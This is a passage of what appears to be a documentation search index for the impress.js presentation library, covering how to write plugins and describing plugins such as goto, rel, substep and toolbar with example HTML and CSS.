/home/hingo/hacking/impress.js/js/impress.js /home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:271 throw new JS_Parse_Error(message, line, col, pos); ^ Error at new JS_Parse_Error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:263:18) at js_error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:271:11) at croak (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:733:9) at token_error (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:740:9) at unexpected (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:746:9) at Object.semicolon [as 1] (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:766:43) at prog1 (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:1314:21) at simple_statement (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:906:27) at /home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:814:19 at block_ (/home/hingo/hacking/impress.js/node_modules/uglify-js/lib/parse-js.js:1003:20) You will be pleased to know, that the concatenation of the unminified file js/impress.js has already succeeded at this point. Just open a test in your browser, and the browser will show you the line and error.", "title": "Tip: Build errors"}, {"location": "devcon5/src/plugins/#structure-naming-and-policy", "text": "Each plugin is contained within its own directory. The name of the directory is the name of the plugin. For example, imagine a plugin called pluginA : src/plugins/plugina/ The main javascript file should use the directory name as its root name: src/plugins/plugina/plugina.js For most plugins, a single .js file is enough. Note that the plugin name is also used as a namespace for various things. For example, the autoplay plugin can be configured by setting the data-autoplay=\"5\" attribute on a div . As a general rule ids, classes and attributes within the div#impress root element, may use the plugin name directly (e.g. data-autoplay=\"5\" ). However, outside of the root element, you should use impress-pluginname (e.g. <div id=\"impress-toolbar\"> . The latter (longer) form also applies to all events, they should be prefixed with impress:pluginname . You should use crisp and descriptive names for your plugins. But sometimes you might optimize for a short namespace. Hence, the Relative Positioning Plugin is called rel to keep html attributes short. You should not overuse this idea! Note that for default plugins, which is all plugins in this directory, NO css, html or image files are allowed. Default plugins must not add any global variables.", "title": "Structure, naming and policy"}, {"location": "devcon5/src/plugins/#testing", "text": "The plugin directory should also include tests, which should use the QUnit and Syn libraries under test/ . You can have as many tests as you like, but it is suggested your first and main test file is called plugina_tests.html and plugina_tests.js respectively. You need to add your test .js file into /qunit_test_runner.html , and the .js file should start by loading the test .html file into the iframe#presentation-iframe . See navigation-ui plugin for an example. You are allowed to test your plugin whatever way you like, but the general approach is for the test to load the js/impress.js file produced by build.js. This way you are testing what users will actually be using, rather than the uncompiled source code.", "title": "Testing"}, {"location": "devcon5/src/plugins/#howto-write-a-plugin", "text": "", "title": "HowTo write a plugin"}, {"location": "devcon5/src/plugins/#encapsulation", "text": "To avoid polluting the global namespace, plugins must encapsulate them in the standard javascript anonymous function: /** * Plugin A - An example plugin * * Description... * * Copyright 2016 Firstname Lastname, email or github handle * Released under the MIT license. */ (function ( document, window ) { // Plugin implementation... })(document, window);", "title": "Encapsulation"}, {"location": "devcon5/src/plugins/#init-plugins", "text": "We categorize plugins into various categories, based on how and when they are called, and what they do. An init plugin is the simplest kind of plugin. It simply listens for the impress().init() method to send the impress:init event, at which point the plugin can initialize itself and start doing whatever it does, for example by calling methods in the public api returned by impress() . The impress:init event has the div#impress element as its target attribute, whereas event.detail.api contains the same object that is returned by calling impress() . It is customary to store the api object sent by the event rather than calling impress() from the global namespace. Example: /** * Plugin A - An example plugin * * Description... * * Copyright 2016 Firstname Lastname, email or github handle * Released under the MIT license. */ (function ( document, window ) { var root; var api; var lib; document.addEventListener( \"impress:init\", function( event ) { root = event.target; api = event.detail.api; lib = api.lib; // Element attributes starting with \"data-\", become available under // element.dataset. In addition hyphenized words become camelCased. var data = root.dataset; // Get value of `<div id=\"impress\" data-plugina-foo=\"...\">` var foo = data.pluginaFoo; // ... } })(document, window); Both Navigation and Autoplay are init plugins. To provide end user configurability in your plugin, a good idea might be to read html attributes from the impress presentation. The Autoplay plugin does exactly this, you can provide a default value in the div#impress element, or in each div.step . A plugin must only use html attributes in its designated namespace, which is data-pluginName-*=\"value\" For example, if pluginA offers config options foo and bar , it would look like this: <div id=\"impress\" data-plugina-foo=\"5\" data-plugina-bar=\"auto\" >", "title": "Init plugins"}, {"location": "devcon5/src/plugins/#pre-init-plugins", "text": "Some plugins need to run before even impress().init() does anything. These are typically filters : they want to modify the html via DOM calls, before impress.js core parses the presentation. We call these pre-init plugins . A pre-init plugin must be called synchronously, before impress().init() is executed. Plugins can register themselves to be called in the pre-init phase by calling: impress.addPreInitPlugin( plugin [, weight] ); The argument plugin must be a function. weight is optional and defaults to 10 . Plugins are ordered by weight when they are executed, with lower weight first. The Relative Positioning Plugin is an example of a pre-init plugin.", "title": "Pre-init plugins"}, {"location": "devcon5/src/plugins/#pre-stepleave-plugins", "text": "A pre-stepleave plugin is called synchronously from impress.js core at the beginning of impress().goto() . To register a plugin, call impress.addPreStepLeavePlugin( plugin [, weight] ); When the plugin function is executed, it will be passed an argument that resembles the event object from DOM event handlers: event.target contains the current step, which we are about to leave. event.detail.next contains the element we are about to transition to. event.detail.reason contains a string, one of \"next\", \"prev\" or \"goto\", which tells you which API function was called to initiate the transition. event.detail.transitionDuration contains the transitionDuration for the upcoming transition. A pre-stepleave plugin may alter the values in event.detail (except for reason ), and this can change the behavior of the upcoming transition. For example, the goto plugin will set the event.detail.next to point to some other element, causing the presentation to jump to that step instead.", "title": "Pre-StepLeave plugins"}, {"location": "devcon5/src/plugins/#gui-plugins", "text": "A GUI plugin is actually just an init plugin, but is a special category that exposes visible widgets or effects in the presentation. For example, it might provide clickable buttons to go to the next and previous slide. Note that all plugins shipped in the default set must not produce any visible html elements unless the user asks for it. A recommended best practice is to let the user add a div element, with an id equaling the plugin's namespace, in the place where he wants to see whatever visual UI elements the plugin is providing: <div id=\"impress-plugina\"></div> Another way to show the elements of a UI plugin might be by allowing the user to explicitly press a key, like \"H\" for a help dialog. Toolbar plugin is an example of a GUI plugin. It presents a toolbar where other plugins can add their buttons in a centralized fashion. Remember that for default plugins, even GUI plugins, no html files, css files or images are allowed. Everything must be generated from javascript. The idea is that users can theme widgets with their own CSS. (A plugin is of course welcome to provide example CSS that can be copypasted :-)", "title": "GUI plugins"}, {"location": "devcon5/src/plugins/#dependencies", "text": "If pluginB depends on the existence of pluginA , and also pluginA must run before pluginB , then pluginB should not listen to the impress:init event, rather pluginA should send its own init event, which pluginB listens to. Example: // pluginA document.addEventListener(\"impress:init\", function (event) { // plugin A does it's own initialization first... // Signal other plugins that plugin A is now initialized var root = document.querySelector( \"div#impress\" ); var event = document.createEvent(\"CustomEvent\"); event.initCustomEvent(\"impress:plugina:init', true, true, { \"plugina\" : \"data...\" }); root.dispatchEvent(event); }, false); // pluginB document.addEventListener(\"impress:plugina:init\", function (event) { // plugin B implementation }, false); A plugin should use the namespace impress:pluginname:* for any events it sends. In theory all plugins could always send an init and other events, but in practice we're adding them on an as needed basis.", "title": "Dependencies"}, {"location": "devcon5/src/plugins/extras/", "text": "Extras Plugin \u00b6 The Extras plugin will initialize the optional addon plugins from extras/ directory, if they were loaded. Generally, for an extras plugin to have been loaded, 2 things must have happened: The extras plugins must be present in extras/ directory, for example after running git submodule update One or more extras plugins are added to the impress.js presentation (the HTML file) by the author using a regular <script> tag. If one or more extras plugins were so added, this plugin will automatically discover them and perform initialization (such as calling mermaid.initialize() ). If no extras plugins are added to a presentation, this plugin does nothing. Note that some extra plugins (like mathjax) initialize themselves immediately, and there's nothing to do here. Author \u00b6 Henrik Ingo (@henrikingo), 2016", "title": "Extras Plugin"}, {"location": "devcon5/src/plugins/extras/#extras-plugin", "text": "The Extras plugin will initialize the optional addon plugins from extras/ directory, if they were loaded. Generally, for an extras plugin to have been loaded, 2 things must have happened: The extras plugins must be present in extras/ directory, for example after running git submodule update One or more extras plugins are added to the impress.js presentation (the HTML file) by the author using a regular <script> tag. If one or more extras plugins were so added, this plugin will automatically discover them and perform initialization (such as calling mermaid.initialize() ). If no extras plugins are added to a presentation, this plugin does nothing. Note that some extra plugins (like mathjax) initialize themselves immediately, and there's nothing to do here.", "title": "Extras Plugin"}, {"location": "devcon5/src/plugins/extras/#author", "text": "Henrik Ingo (@henrikingo), 2016", "title": "Author"}, {"location": "devcon5/src/plugins/goto/", "text": "Goto Plugin \u00b6 The goto plugin is a pre-stepleave plugin. It is executed before impress:stepleave event, and will alter the destination where to transition next. Example: <!-- When leaving this step, go directly to \"step-5\" --> <div class=\"step\" data-goto=\"step-5\"> <!-- When leaving this step with next(), go directly to \"step-5\", instead of the next step. If moving backwards to previous step - e.g. prev() instead of next() - then go to \"step-1\". --> <div class=\"step\" data-goto-next=\"step-5\" data-goto-prev=\"step-1\"> <!-- data-goto-key-list and data-goto-next-list allow you to build advanced non-linear navigation. --> <div class=\"step\" data-goto-key-list=\"ArrowUp ArrowDown ArrowRight ArrowLeft\" data-goto-next-list=\"step-4 step-3 step-2 step-5\"> See https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key/Key_Values for a table of what strings to use for each key. Author \u00b6 Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Goto Plugin"}, {"location": "devcon5/src/plugins/goto/#goto-plugin", "text": "The goto plugin is a pre-stepleave plugin. It is executed before impress:stepleave event, and will alter the destination where to transition next. Example: <!-- When leaving this step, go directly to \"step-5\" --> <div class=\"step\" data-goto=\"step-5\"> <!-- When leaving this step with next(), go directly to \"step-5\", instead of the next step. If moving backwards to previous step - e.g. prev() instead of next() - then go to \"step-1\". --> <div class=\"step\" data-goto-next=\"step-5\" data-goto-prev=\"step-1\"> <!-- data-goto-key-list and data-goto-next-list allow you to build advanced non-linear navigation. --> <div class=\"step\" data-goto-key-list=\"ArrowUp ArrowDown ArrowRight ArrowLeft\" data-goto-next-list=\"step-4 step-3 step-2 step-5\"> See https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key/Key_Values for a table of what strings to use for each key.", "title": "Goto Plugin"}, {"location": "devcon5/src/plugins/goto/#author", "text": "Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Author"}, {"location": "devcon5/src/plugins/help/", "text": "Help screen plugin \u00b6 Shows a help popup when a presentation is loaded, as well as when 'H' is pressed. To enable the help popup, add following div to your presentation: <div id=\"impress-help\"></div> Example CSS: .impress-enabled #impress-help { background: none repeat scroll 0 0 rgba(0, 0, 0, 0.5); color: #EEEEEE; font-size: 80%; position: fixed; left: 2em; bottom: 2em; width: 24em; border-radius: 1em; padding: 1em; text-align: center; z-index: 100; font-family: Verdana, Arial, Sans; } .impress-enabled #impress-help td { padding-left: 1em; padding-right: 1em; } Author \u00b6 Copyright Henrik Ingo (@henrikingo), 2016 MIT License", "title": "Help Screen Plugin"}, {"location": "devcon5/src/plugins/help/#help-screen-plugin", "text": "Shows a help popup when a presentation is loaded, as well as when 'H' is pressed. To enable the help popup, add following div to your presentation: <div id=\"impress-help\"></div> Example CSS: .impress-enabled #impress-help { background: none repeat scroll 0 0 rgba(0, 0, 0, 0.5); color: #EEEEEE; font-size: 80%; position: fixed; left: 2em; bottom: 2em; width: 24em; border-radius: 1em; padding: 1em; text-align: center; z-index: 100; font-family: Verdana, Arial, Sans; } .impress-enabled #impress-help td { padding-left: 1em; padding-right: 1em; }", "title": "Help screen plugin"}, {"location": "devcon5/src/plugins/help/#author", "text": "Copyright Henrik Ingo (@henrikingo), 2016 MIT License", "title": "Author"}, {"location": "devcon5/src/plugins/impressConsole/", "text": "Impress Console Plugin \u00b6 Press 'P' to show a speaker console window. View of current slide Preview of next slide Speaker notes (contents of a element on current slide) Navigation For speaker notes, add the following anywhere inside a step <div class=\"notes\">Speaker notes text...</div> Example CSS: /* Hide notes from the actual presentation. This will not affect the visibility of notes in the impress console window. */ .notes { display: none; } Credits \u00b6 Henrik Ingo, henrik.ingo@avoinelama.fi, impress.js (plugin) integration Heiko Richler, Aico.Richler@gmx.net, major changes in rev. 1.3 Lennart Regebro, regebro@gmail.com, main author of impressConsole David Souther, davidsouther@gmail.com, author of the original notes.js MIT License", "title": "Impress Console Plugin"}, {"location": "devcon5/src/plugins/impressConsole/#impress-console-plugin", "text": "Press 'P' to show a speaker console window. View of current slide Preview of next slide Speaker notes (contents of a element on current slide) Navigation For speaker notes, add the following anywhere inside a step <div class=\"notes\">Speaker notes text...</div> Example CSS: /* Hide notes from the actual presentation. This will not affect the visibility of notes in the impress console window. */ .notes { display: none; }", "title": "Impress Console Plugin"}, {"location": "devcon5/src/plugins/impressConsole/#credits", "text": "Henrik Ingo, henrik.ingo@avoinelama.fi, impress.js (plugin) integration Heiko Richler, Aico.Richler@gmx.net, major changes in rev. 1.3 Lennart Regebro, regebro@gmail.com, main author of impressConsole David Souther, davidsouther@gmail.com, author of the original notes.js MIT License", "title": "Credits"}, {"location": "devcon5/src/plugins/mobile/", "text": "Mobile devices support \u00b6 Presentations with a lot of 3D effects and graphics can consume a lot of resources, especially on mobile devices. This plugin provides some CSS classes that can be used to hide most of the slides, only showing the current, previous and next slide. In particular, this plugin adds: body.impress-mobile class, if it detects running on a mobile OS. div.prev and div.prev to the adjacent steps to the current one. Note that the current slide is already identified by present and active CSS classes. Example CSS \u00b6 body.impress-mobile .step { display:none; } body.impress-mobile .step.active, body.impress-mobile .step.present, body.impress-mobile .step.next, body.impress-mobile .step.prev { display:block; } Note \u00b6 This plugin does not take into account redirects that could happen with skip, goto and other plugins. The active step will of course always be correct, but \"non-linear\" transitions to anything else than the actual previous and next steps will probably not look correct. Author \u00b6 Kurt Zenisek (@KZeni)", "title": "Mobile Devices Support"}, {"location": "devcon5/src/plugins/mobile/#mobile-devices-support", "text": "Presentations with a lot of 3D effects and graphics can consume a lot of resources, especially on mobile devices. This plugin provides some CSS classes that can be used to hide most of the slides, only showing the current, previous and next slide. In particular, this plugin adds: body.impress-mobile class, if it detects running on a mobile OS. div.prev and div.prev to the adjacent steps to the current one. Note that the current slide is already identified by present and active CSS classes.", "title": "Mobile devices support"}, {"location": "devcon5/src/plugins/mobile/#example-css", "text": "body.impress-mobile .step { display:none; } body.impress-mobile .step.active, body.impress-mobile .step.present, body.impress-mobile .step.next, body.impress-mobile .step.prev { display:block; }", "title": "Example CSS"}, {"location": "devcon5/src/plugins/mobile/#note", "text": "This plugin does not take into account redirects that could happen with skip, goto and other plugins. The active step will of course always be correct, but \"non-linear\" transitions to anything else than the actual previous and next steps will probably not look correct.", "title": "Note"}, {"location": "devcon5/src/plugins/mobile/#author", "text": "Kurt Zenisek (@KZeni)", "title": "Author"}, {"location": "devcon5/src/plugins/mouse-timeout/", "text": "Mouse timeout plugin \u00b6 After 3 seconds of mouse inactivity, add the css class body.impress-mouse-timeout . On mousemove , click or touch , remove the class. The use case for this plugin is to use CSS to hide elements from the screen and only make them visible when the mouse is moved. Examples where this might be used are: the toolbar from the toolbar plugin, and the mouse cursor itself. Example CSS \u00b6 body.impress-mouse-timeout { cursor: none; } body.impress-mouse-timeout div#impress-toolbar { display: none; } Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Mouse Timeout Plugin"}, {"location": "devcon5/src/plugins/mouse-timeout/#mouse-timeout-plugin", "text": "After 3 seconds of mouse inactivity, add the css class body.impress-mouse-timeout . On mousemove , click or touch , remove the class. The use case for this plugin is to use CSS to hide elements from the screen and only make them visible when the mouse is moved. Examples where this might be used are: the toolbar from the toolbar plugin, and the mouse cursor itself.", "title": "Mouse timeout plugin"}, {"location": "devcon5/src/plugins/mouse-timeout/#example-css", "text": "body.impress-mouse-timeout { cursor: none; } body.impress-mouse-timeout div#impress-toolbar { display: none; } Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Example CSS"}, {"location": "devcon5/src/plugins/navigation-ui/", "text": "Navigation UI plugin \u00b6 This plugin provides UI elements \"back\", \"forward\" and a list to select a specific slide number. The navigation controls are visible if the toolbar plugin is enabled. To add the toolbar to your presentations, see toolbar plugin README . Author \u00b6 Henrik Ingo (@henrikingo), 2016", "title": "Navigation UI Plugin"}, {"location": "devcon5/src/plugins/navigation-ui/#navigation-ui-plugin", "text": "This plugin provides UI elements \"back\", \"forward\" and a list to select a specific slide number. The navigation controls are visible if the toolbar plugin is enabled. To add the toolbar to your presentations, see toolbar plugin README .", "title": "Navigation UI plugin"}, {"location": "devcon5/src/plugins/navigation-ui/#author", "text": "Henrik Ingo (@henrikingo), 2016", "title": "Author"}, {"location": "devcon5/src/plugins/progress/", "text": "Progress plugin \u00b6 Progressbar and pagexounter for impress.js presentations Usage \u00b6 Add a div for progressbar and/or progress as you can see it here: HTML \u00b6 <div class=\"impress-progressbar\"><div></div></div> <div class=\"impress-progress\"></div> Sample CSS \u00b6 .impress-progressbar { position: absolute; right: 318px; bottom: 1px; left: 118px; border-radius: 7px; border: 2px solid rgba(100, 100, 100, 0.2); } .impress-progressbar DIV { width: 0; height: 2px; border-radius: 5px; background: rgba(75, 75, 75, 0.4); transition: width 1s linear; } .impress-progress { position: absolute; left: 59px; bottom: 1px; text-align: left; opacity: 0.6; } Feel free to change the style of your progressbar as you like by editing the CSS file. Author \u00b6 Copyright 2014: Matthias Bilger (@m42e)", "title": "Progress Plugin"}, {"location": "devcon5/src/plugins/progress/#progress-plugin", "text": "Progressbar and pagexounter for impress.js presentations", "title": "Progress plugin"}, {"location": "devcon5/src/plugins/progress/#usage", "text": "Add a div for progressbar and/or progress as you can see it here:", "title": "Usage"}, {"location": "devcon5/src/plugins/progress/#html", "text": "<div class=\"impress-progressbar\"><div></div></div> <div class=\"impress-progress\"></div>", "title": "HTML"}, {"location": "devcon5/src/plugins/progress/#sample-css", "text": ".impress-progressbar { position: absolute; right: 318px; bottom: 1px; left: 118px; border-radius: 7px; border: 2px solid rgba(100, 100, 100, 0.2); } .impress-progressbar DIV { width: 0; height: 2px; border-radius: 5px; background: rgba(75, 75, 75, 0.4); transition: width 1s linear; } .impress-progress { position: absolute; left: 59px; bottom: 1px; text-align: left; opacity: 0.6; } Feel free to change the style of your progressbar as you like by editing the CSS file.", "title": "Sample CSS"}, {"location": "devcon5/src/plugins/progress/#author", "text": "Copyright 2014: Matthias Bilger (@m42e)", "title": "Author"}, {"location": "devcon5/src/plugins/rel/", "text": "Relative Positioning Plugin \u00b6 This plugin provides support for defining the coordinates of a step relative to previous steps. This is often more convenient when creating presentations, since as you add, remove or move steps, you may not need to edit the positions as much as is the case with the absolute coordinates supported by impress.js core. Example: <!-- Position step 1000 px to the right and 500 px up from the previous step. --> <div class=\"step\" data-rel-x=\"1000\" data-rel-y=\"500\"> <!-- Position step 1000 px to the left and 750 px up from the step with id \"title\". --> <div class=\"step\" data-rel-x=\"-1000\" data-rel-y=\"750\" data-rel-to=\"title\"> Following html attributes are supported for step elements: data-rel-x data-rel-y data-rel-z data-rel-to Non-zero values are also inherited from the previous step. This makes it easy to create a boring presentation where each slide shifts for example 1000px down from the previous. The above relative values are ignored, or set to zero, if the corresponding absolute value ( data-x etc...) is set. Note that this also has the effect of resetting the inheritance functionality. In addition to plain numbers, which are pixel values, it is also possible to define relative positions as a multiple of screen height and width, using a unit of \"h\" and \"w\", respectively, appended to the number. Example: <div class=\"step\" data-rel-x=\"1.5w\" data-rel-y=\"1.5h\"> Note that referencing a special step with the data-rel-to attribute is limited to previous steps to avoid the possibility of circular or offending positioning. If you need a reference to a step that is shown later make use of the goto plugin: <div id=\"shown-first\" class=\"step\" data-goto-next=\"shown-earlier\"> <div id=\"shown-later\" class=\"step\" data-goto-prev=\"shown-earlier\" data-goto-next=\"shown-last\"> <div id=\"shown-earlier\" class=\"step\" data-rel-to=\"shown-later\" data-rel-x=\"1000\" data-rel-y=\"500\" data-goto-prev=\"shown-first\" data-goto-next=\"shown-later\"> <div id=\"shown-last\" class=\"step\" data-goto-prev=\"shown-later\"> IMPORTANT: Incompatible change \u00b6 Enabling / adding this plugin has a small incompatible side effect on default values. Prior to this plugin, a missing data-x/y/z attribute would be assigned the default value of 0. But when using a version of impress.js with this plugin enabled, a missing data-x/y/z attribute will inherit the value from the previous step. (The first step will inherit the default value of 0.) For example, if you have an old presentation with the following 3 steps, they would be positioned differently when using a version of impress.js that includes this plugin: <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> To get the same rendering now, you need to add an explicit data-z=\"0\" to the second step: <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"0\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> Note that the latter code will render correctly also in old versions of impress.js. If you have an old presentation that doesn't use relative positioning, and for some reason you cannot or don't want to add the explicit 0 values where needed, your last resort is to simply remove the rel.js plugin completely. You can either: Remove rel.js from /build.js and recompile impress.js with: npm build Just open [/js/impress.js] in an editor and delete the rel.js code. Or, just uncomment the following single line, which is the last line of the plugin: impress.addPreInitPlugin( rel ); About Pre-Init Plugins \u00b6 This plugin is a pre-init plugin . It is called synchronously from impress.js core at the beginning of impress().init() . This allows it to process its own data attributes first, and possibly alter the data-x, data-y and data-z attributes that will then be processed by impress().init() . (Another name for this kind of plugin might be called a filter plugin , but pre-init plugin is more generic, as a plugin might do whatever it wants in the pre-init stage.) Author \u00b6 Henrik Ingo (@henrikingo), 2016", "title": "Relative Positioning Plugin"}, {"location": "devcon5/src/plugins/rel/#relative-positioning-plugin", "text": "This plugin provides support for defining the coordinates of a step relative to previous steps. This is often more convenient when creating presentations, since as you add, remove or move steps, you may not need to edit the positions as much as is the case with the absolute coordinates supported by impress.js core. Example: <!-- Position step 1000 px to the right and 500 px up from the previous step. --> <div class=\"step\" data-rel-x=\"1000\" data-rel-y=\"500\"> <!-- Position step 1000 px to the left and 750 px up from the step with id \"title\". --> <div class=\"step\" data-rel-x=\"-1000\" data-rel-y=\"750\" data-rel-to=\"title\"> Following html attributes are supported for step elements: data-rel-x data-rel-y data-rel-z data-rel-to Non-zero values are also inherited from the previous step. This makes it easy to create a boring presentation where each slide shifts for example 1000px down from the previous. The above relative values are ignored, or set to zero, if the corresponding absolute value ( data-x etc...) is set. Note that this also has the effect of resetting the inheritance functionality. In addition to plain numbers, which are pixel values, it is also possible to define relative positions as a multiple of screen height and width, using a unit of \"h\" and \"w\", respectively, appended to the number. Example: <div class=\"step\" data-rel-x=\"1.5w\" data-rel-y=\"1.5h\"> Note that referencing a special step with the data-rel-to attribute is limited to previous steps to avoid the possibility of circular or offending positioning. If you need a reference to a step that is shown later make use of the goto plugin: <div id=\"shown-first\" class=\"step\" data-goto-next=\"shown-earlier\"> <div id=\"shown-later\" class=\"step\" data-goto-prev=\"shown-earlier\" data-goto-next=\"shown-last\"> <div id=\"shown-earlier\" class=\"step\" data-rel-to=\"shown-later\" data-rel-x=\"1000\" data-rel-y=\"500\" data-goto-prev=\"shown-first\" data-goto-next=\"shown-later\"> <div id=\"shown-last\" class=\"step\" data-goto-prev=\"shown-later\">", "title": "Relative Positioning Plugin"}, {"location": "devcon5/src/plugins/rel/#important-incompatible-change", "text": "Enabling / adding this plugin has a small incompatible side effect on default values. Prior to this plugin, a missing data-x/y/z attribute would be assigned the default value of 0. But when using a version of impress.js with this plugin enabled, a missing data-x/y/z attribute will inherit the value from the previous step. (The first step will inherit the default value of 0.) For example, if you have an old presentation with the following 3 steps, they would be positioned differently when using a version of impress.js that includes this plugin: <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> To get the same rendering now, you need to add an explicit data-z=\"0\" to the second step: <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"100\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\" data-z=\"0\"></div> <div class=\"step\" data-x=\"100\" data-y=\"100\"></div> Note that the latter code will render correctly also in old versions of impress.js. If you have an old presentation that doesn't use relative positioning, and for some reason you cannot or don't want to add the explicit 0 values where needed, your last resort is to simply remove the rel.js plugin completely. You can either: Remove rel.js from /build.js and recompile impress.js with: npm build Just open [/js/impress.js] in an editor and delete the rel.js code. Or, just uncomment the following single line, which is the last line of the plugin: impress.addPreInitPlugin( rel );", "title": "IMPORTANT: Incompatible change"}, {"location": "devcon5/src/plugins/rel/#about-pre-init-plugins", "text": "This plugin is a pre-init plugin . It is called synchronously from impress.js core at the beginning of impress().init() . This allows it to process its own data attributes first, and possibly alter the data-x, data-y and data-z attributes that will then be processed by impress().init() . (Another name for this kind of plugin might be called a filter plugin , but pre-init plugin is more generic, as a plugin might do whatever it wants in the pre-init stage.)", "title": "About Pre-Init Plugins"}, {"location": "devcon5/src/plugins/rel/#author", "text": "Henrik Ingo (@henrikingo), 2016", "title": "Author"}, {"location": "devcon5/src/plugins/skip/", "text": "Skip Plugin \u00b6 Example: <!-- This slide is disabled in presentations, when moving with next() and prev() commands, but you can still move directly to it, for example with a url (anything using goto()). --> <div class=\"step skip\"> The skip plugin is a pre-stepleave plugin. It is executed before impress:stepleave event. If the next step also has class=\"skip\" set, it will set the next step to the one after that. Author \u00b6 Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Skip Plugin"}, {"location": "devcon5/src/plugins/skip/#skip-plugin", "text": "Example: <!-- This slide is disabled in presentations, when moving with next() and prev() commands, but you can still move directly to it, for example with a url (anything using goto()). --> <div class=\"step skip\"> The skip plugin is a pre-stepleave plugin. It is executed before impress:stepleave event. If the next step also has class=\"skip\" set, it will set the next step to the one after that.", "title": "Skip Plugin"}, {"location": "devcon5/src/plugins/skip/#author", "text": "Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Author"}, {"location": "devcon5/src/plugins/stop/", "text": "Stop Plugin \u00b6 Example: <!-- Stop at this slide. (For example, when used on the last slide, this prevents the presentation from wrapping back to the beginning.) --> <div class=\"step stop\"> The stop plugin is a pre-stepleave plugin. It is executed before impress:stepleave event. If the current slide has class=\"stop\" set, it will disable the next() command by setting the next slide to the current slide. Author \u00b6 Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Stop Plugin"}, {"location": "devcon5/src/plugins/stop/#stop-plugin", "text": "Example: <!-- Stop at this slide. (For example, when used on the last slide, this prevents the presentation from wrapping back to the beginning.) --> <div class=\"step stop\"> The stop plugin is a pre-stepleave plugin. It is executed before impress:stepleave event. If the current slide has class=\"stop\" set, it will disable the next() command by setting the next slide to the current slide.", "title": "Stop Plugin"}, {"location": "devcon5/src/plugins/stop/#author", "text": "Copyright 2016 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Author"}, {"location": "devcon5/src/plugins/substep/", "text": "Substep Plugin \u00b6 Reveal each substep (such as a bullet point) of the step separately. Just like in PowerPoint! If the current step contains html elements with class=\"substep\" then this plugin will prevent a prev() / next() call to leave the slide, and instead reveal the next substep (for next() ) or alternatively hide one (for prev() ). Only once all substeps are shown, will a call to next() actually move to the next step, and only when all are hidden will a call to prev() move to the previous one. Calls to goto() will be ignored by this plugin, i.e. goto() will transition to whichever step is the target. In practice what happens is that when each substep is stepped through via next() calls, a class=\"substep-visible\" class is added to the element. It is up to the presentation author to use the appropriate CSS to make the substeps hidden and visible. Example: <style type=\"text/css\"> .substep { opacity: 0; } .substep.substep-visible { opacity: 1; transition: opacity 1s; } </style> <div class=\"step\"> <h1>Fruits</h1> <p class=\"substep\">Orange</p> <p class=\"substep\">Apple</p> </div> Author \u00b6 Copyright 2017 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Substep Plugin"}, {"location": "devcon5/src/plugins/substep/#substep-plugin", "text": "Reveal each substep (such as a bullet point) of the step separately. Just like in PowerPoint! If the current step contains html elements with class=\"substep\" then this plugin will prevent a prev() / next() call to leave the slide, and instead reveal the next substep (for next() ) or alternatively hide one (for prev() ). Only once all substeps are shown, will a call to next() actually move to the next step, and only when all are hidden will a call to prev() move to the previous one. Calls to goto() will be ignored by this plugin, i.e. goto() will transition to whichever step is the target. In practice what happens is that when each substep is stepped through via next() calls, a class=\"substep-visible\" class is added to the element. It is up to the presentation author to use the appropriate CSS to make the substeps hidden and visible. Example: <style type=\"text/css\"> .substep { opacity: 0; } .substep.substep-visible { opacity: 1; transition: opacity 1s; } </style> <div class=\"step\"> <h1>Fruits</h1> <p class=\"substep\">Orange</p> <p class=\"substep\">Apple</p> </div>", "title": "Substep Plugin"}, {"location": "devcon5/src/plugins/substep/#author", "text": "Copyright 2017 Henrik Ingo (@henrikingo) Released under the MIT license.", "title": "Author"}, {"location": "devcon5/src/plugins/toolbar/", "text": "Toolbar plugin \u00b6 This plugin provides a generic graphical toolbar. Other plugins that want to expose a button or other widget, can add those to this toolbar. Using a single consolidated toolbar for all GUI widgets makes it easier to position and style the toolbar rather than having to do that for lots of different divs. To add/activate the toolbar in your presentation, add this div: <div id=\"impress-toolbar\"></div> Styling the toolbar is left to presentation author. Here's an example CSS: .impress-enabled div#impress-toolbar { position: fixed; right: 1px; bottom: 1px; opacity: 0.6; } .impress-enabled div#impress-toolbar > span { margin-right: 10px; } The mouse-timeout plugin can be leveraged to hide the toolbar from sight, and only make it visible when mouse is moved. body.impress-mouse-timeout div#impress-toolbar { display: none; } If you're writing a plugin and would like to add a widget to the toolbar, see the top of the source file for further instructions . Author \u00b6 Henrik Ingo (@henrikingo), 2016", "title": "Toolbar Plugin"}, {"location": "devcon5/src/plugins/toolbar/#toolbar-plugin", "text": "This plugin provides a generic graphical toolbar. Other plugins that want to expose a button or other widget, can add 